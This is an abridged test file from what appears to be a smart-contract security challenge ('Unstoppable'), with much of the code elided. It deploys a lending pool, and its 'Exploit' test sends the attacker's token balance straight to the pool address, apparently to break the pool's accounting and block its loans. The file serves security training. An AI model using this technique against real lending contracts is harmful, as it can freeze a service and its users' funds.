...
describe('[Challenge] Unstoppable', function () {
  ...
  const INITIAL_ATTACKER_TOKEN_BALANCE =
  ...
  before(async function () {
    ...
    this.pool = await UnstoppableLenderFactory.deploy(
      this.token.address
    );
  ...
  it('Exploit', async function () {
    ...
    const tokenWithAttacker = this.token.connect(attacker);

    await tokenWithAttacker.transfer(
      this.pool.address,
      INITIAL_ATTACKER_TOKEN_BALANCE
    );
  });
